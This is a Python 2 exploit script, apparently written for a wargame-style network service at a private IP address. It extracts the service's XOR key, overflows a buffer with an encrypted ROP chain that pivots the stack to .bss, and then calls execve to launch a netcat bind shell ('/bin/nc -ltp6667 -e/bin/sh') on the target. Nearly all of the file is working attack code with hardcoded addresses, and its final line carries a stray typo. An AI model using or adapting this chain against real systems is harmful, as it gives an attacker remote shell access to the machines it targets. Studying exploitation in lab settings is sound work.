#! /usr/bin/env python
import socket
from time import sleep
from struct import pack

def encrypt(text, key, keysize):
    return "".join([chr(ord(x) ^ ord(key[ i % keysize])) for i, x in enumerate(text)])

def xorstr(a, b):
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

# Connect to target and receive 1st message.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.25.2", 20002))
sleep(0.5)
s.recv(1024)

# Send dummy data and extract key from response.
keysize = 128
dummy = "A"*keysize
s.send("E")
s.send(pack("<L", keysize))
s.send(dummy)
s.recv(2048)
temp = s.recv(2048)
encrypted = temp[-keysize:]
key = xorstr(dummy, encrypted)

# Test to detect any issues.
if len(key) != keysize or key.find("encryption") != -1:
    print "Key extraction fail."
    exit(1)

################ Exploit starts here. ##################
base = 0x0804b420 # Base of new frame.
junk = "A"*0x20010
bss = pack("<L", base)
nread = pack("<L", 0x0804952d)
fd = pack("<L", 0)
size = pack("<L", 100)
popebp = pack("<L", 0x08048b13)
ebp = bss
leaveret = pack("<L", 0x08048b41)
# pop ebp (.bss); nread(fd, @bss, size); leave (.bss) + ret (.bss+4)
stage0 = popebp + ebp + nread + leaveret + fd + bss + size
payload1 = junk + stage0

# Send Stage0 payload
cipher1 = encrypt(payload1, key, keysize)
s.send("E")
s.send(pack("<L", len(cipher1)))
s.send(cipher1)
print "stage0 SENT"
sleep(0.5)

# Clean socket.
s.recv(0xffffff)
s.send("Q")
sleep(0.5)

# Stage1.
null = pack("<L", 0x0) # Null pointer
filler = "DDDD" # placeholder junk.
execve = pack("<L", 0x080489b0) # execve@plt to launch backdoor.
exit = pack("<L", 0x08048960) # exit@plt for a graceful exit.
args = pack("<L", base + 24) # 2nd arg for execve() {"/bin/nc", "-lp6667", "-e/bin/sh", NULL}
envp = null # Third argument  for execve()

data_offset = 40 # filler + @execve + @exit + 3 execve args + args[4] == 40
# execve() arguments
binnc = pack("<L", base + data_offset)
ncarg1 = pack("<L", base + data_offset + 8) # -ltp6667 is 8 bytes after binnc
ncarg2 = pack("<L", base + data_offset + 17) # -e/bin/sh is 17 bytes after binnc


# Send Stage2 payload.
stage1 = filler + execve + exit + binnc + args + envp
stage1 += binnc + ncarg1 + ncarg2 + null
stage1 += "/bin/nc\x00" + "-ltp6667\x00" + "-e/bin/sh\x00"
junk = "E" * (100 - len(stage1))
s.send(stage1+junk)
print "stage1 SENT"
s.close()ss